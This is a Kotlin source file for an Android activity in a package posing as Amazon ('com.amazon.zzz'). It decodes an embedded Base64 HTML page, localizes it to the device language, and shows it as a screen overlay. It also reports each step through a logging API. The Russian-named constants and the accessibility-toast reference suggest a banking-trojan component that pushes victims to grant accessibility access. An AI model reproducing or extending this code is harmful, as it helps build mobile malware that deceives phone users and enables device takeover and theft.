package com.amazon.zzz.Activities

import android.app.Activity
import android.graphics.PixelFormat
import android.os.Bundle
import android.util.Base64
import android.view.Gravity
import android.view.MotionEvent
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.constNm
import java.util.Locale


class DialogActivity : Activity() {
    private var webView: WebView? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        runCatching {
            apiUt.sendLogs(this, "", "DialogActivity onCreate", "log")
            super.onCreate(savedInstanceState)

            var base64 = actToastAccessbility.s228
            val data = Base64.decode(base64, Base64.DEFAULT)
            base64 = String(data, constNm.utf)

            val lang = Locale.getDefault().language
            val lan = "en"
            base64 = base64.replace("<html lang=\"$lan\">", "<html lang=\"$lang\">")
            base64 = base64.replace(
                constNm.ключ_от_всего,
                constNm.шифрование + lang + constNm.ss5
            )

            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                2,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH or
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
            )
            params.gravity = Gravity.BOTTOM

            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            webView = WebView(this@DialogActivity)

            webView?.loadDataWithBaseURL(null, base64, "text/html", "UTF-8", null)
            webView?.webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                    apiUt.sendLogs(this@DialogActivity, "", "DialogActivity loadUrl", "log")
                    view.loadUrl(url)
                    return true
                }
            }

            // Add layout to window manager
            wm.addView(webView, params)
        }
    }

    override fun onTouchEvent(event: MotionEvent?): Boolean {
        finish()
        return super.onTouchEvent(event)
    }

    public override fun onDestroy() {
        runCatching {
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.removeView(webView)
        }
        apiUt.sendLogs(this@DialogActivity, "", "DialogActivity onDestroy", "log")
        super.onDestroy()
    }
}